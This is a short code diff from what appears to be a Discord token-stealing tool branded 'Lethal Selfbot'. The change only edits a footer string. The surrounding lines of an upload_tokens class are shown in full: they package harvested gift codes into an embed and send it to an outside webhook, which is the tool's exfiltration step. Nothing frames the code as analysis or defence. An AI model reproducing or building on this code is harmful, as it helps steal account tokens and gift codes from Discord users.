@@ -345,6 +345,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="Powed By Lethal Selfbot")
+            embed.set_footer(text="Powed-By-Lethal-Selfbot")
 
             self.webhook.send(embed=embed, username="Lethal", avatar_url="https://i.imgur.com/HjzfjfR.png")
